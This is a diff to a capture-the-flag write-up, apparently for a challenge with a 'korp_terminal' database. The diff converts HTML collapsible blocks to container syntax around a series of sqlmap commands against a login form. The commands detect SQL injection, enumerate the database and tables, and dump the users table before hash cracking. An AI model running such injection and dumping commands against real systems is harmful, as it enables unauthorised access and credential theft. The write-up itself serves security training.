@@ -36,10 +36,8 @@ Simple SQLi payloads didnt work, so I decided to use SQLMap.
 * `--ignore-code 401` is required to keep testing, website returns 401 because of failed login.
 * `--dbms=MySQL` From error we know that backend is MariaDB (fork of the MySQL)
 
-<details>
 
-<summary>Command: `sqlmap -u http://SERVER:IP --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 --batch`</summary>
-
+::: details Command: `sqlmap -u http://SERVER:IP --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 --batch`
 ```log
 └─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 --batch
         ___
@@ -130,13 +128,10 @@ back-end DBMS: MySQL >= 5.0 (MariaDB fork)
 
 [*] ending @ 19:29:32 /2024-03-14/
 ```
+:::
 
-</details>
 
-<details>
-
-<summary>`sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 --current-db`</summary>
-
+::: details `sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 --current-db`
 ```log
 └─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 --current-db
         ___
@@ -180,13 +175,10 @@ current database: 'korp_terminal'
 
 [*] ending @ 19:34:31 /2024-03-14/
 ```
+:::
 
-</details>
 
-<details>
-
-<summary>`sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal --tables`</summary>
-
+::: details `sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal --tables`
 ```log
 └─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal --tables
         ___
@@ -235,13 +227,10 @@ Database: korp_terminal
 
 [*] ending @ 19:34:48 /2024-03-14/
 ```
+:::
 
-</details>
 
-<details>
-
-<summary>`sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal -T users --dump`</summary>
-
+::: details `sqlmap -u http://83.136.249.247:33126 --data 'username=x&#x26;password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal -T users --dump`
 ```log
 └─$ sqlmap -u http://83.136.249.247:33126 --data 'username=x&password=x' --dbms=MySQL --ignore-code 401 -D korp_terminal -T users --dump
         ___
@@ -303,8 +292,7 @@ Table: users
 
 [*] ending @ 19:36:59 /2024-03-14/
 ```
-
-</details>
+:::
 
 The admin password is hashed, meaning we have to crack it:
 
